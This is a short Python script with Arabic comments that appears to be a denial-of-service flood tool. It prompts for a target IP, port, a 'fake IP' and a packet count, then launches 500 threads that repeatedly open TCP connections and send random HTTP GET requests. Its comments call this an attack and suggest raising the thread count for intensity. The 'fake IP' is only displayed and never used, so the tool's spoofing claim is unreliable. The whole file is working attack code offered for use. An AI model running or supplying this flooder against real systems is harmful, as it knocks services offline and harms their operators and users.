import socket
import threading
import random
import string
from colorama import Fore, Style, init

# تهيئة مكتبة colorama
init()

# طلب المدخلات من المستخدم مع ألوان
target_ip = input(Fore.CYAN + "( ∆ ) Target IP: " + Style.RESET_ALL)
target_port = int(input(Fore.CYAN + "( ∆ ) Target PORT: " + Style.RESET_ALL))
fake_ip = input(Fore.CYAN + "( ∆ ) Fake IP: " + Style.RESET_ALL)
num_packets = int(input(Fore.CYAN + "( ∆ ) Number of packets to send: " + Style.RESET_ALL))

# دالة لتوليد بيانات عشوائية
def random_data(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

# دالة الهجوم
def attack():
    sent_packets = 0  # عداد الحزم المرسلة
    while sent_packets < num_packets:
        try:
            # إنشاء اتصال باستخدام بروتوكول TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            # إرسال طلبات وهمية عشوائية
            request = f"GET /{random_data(10)} HTTP/1.1\r\nHost: {random_data(5)}.com\r\n\r\n"
            s.sendto(request.encode('ascii'), (target_ip, target_port))

            sent_packets += 1
            
            # طباعة الحزمة المرسلة مع ألوان
            print(Fore.GREEN + f"( ∆ ) {sent_packets} - {num_packets} : {target_ip}:{target_port} - Fake IP: {fake_ip}" + Style.RESET_ALL)
            
            # رسالة عند إرسال مجموعة من الحزم (مثل كل 1000 حزمة)
            if sent_packets % 1000 == 0:
                print(Fore.YELLOW + f"( ∆ ) Sent {sent_packets} packets so far." + Style.RESET_ALL)

        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        finally:
            # إغلاق الاتصال
            s.close()

# إطلاق عدد من الخيوط (threads) لزيادة سرعة الهجوم
for i in range(500):  # يمكن زيادة الرقم لزيادة شدة الهجوم
    thread = threading.Thread(target=attack)
    thread.start()
